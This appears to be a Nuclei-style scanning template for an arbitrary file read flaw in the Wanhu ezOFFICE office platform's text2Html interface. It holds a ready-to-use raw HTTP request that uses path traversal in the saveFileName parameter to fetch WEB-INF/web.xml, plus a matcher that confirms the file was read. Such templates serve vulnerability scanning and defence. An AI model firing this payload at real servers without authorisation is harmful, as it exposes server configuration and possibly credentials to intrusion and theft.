id: Wanhu-OA-text2Html-read
 
info:
  name: 万户协同办公平台ezoffice text2Html接口存在任意文件读取漏洞，恶意攻击者可能会利用此漏洞获取服务器敏感信息文件。
  author: pitaya
  severity: high

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"
http:
  - raw:
      - |
        POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-Length: 0
        Accept-Encoding: gzip, deflate
        Accept: */*
 
        saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
 
 
 
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"web-app","xmlns")